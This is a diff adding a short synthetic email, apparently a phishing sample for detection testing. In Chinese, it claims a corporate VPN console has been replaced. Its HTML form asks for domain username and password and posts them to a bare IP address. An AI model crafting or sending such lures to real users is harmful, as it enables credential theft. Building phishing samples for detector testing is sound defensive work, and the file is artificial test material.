@@ -1,0 +1,9 @@
+From: =?utf-8?B?6L+c56iL5o6l5YWl?= <vpn@corp-gateway.example>
+To: remote@corp.internal
+Date: Thu, 27 Aug 2026 09:34:00 +0800
+Message-ID: <0019-b4@synth.example>
+Subject: 新 VPN 控制台首次登录
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>VPN 控制台已更换，首次登录需验证：</p><form action='http://203.0.113.60/vpn'><input name='user' placeholder='域账号'><input type='password' name='pass' placeholder='域密码'><button>登录</button></form></body></html>
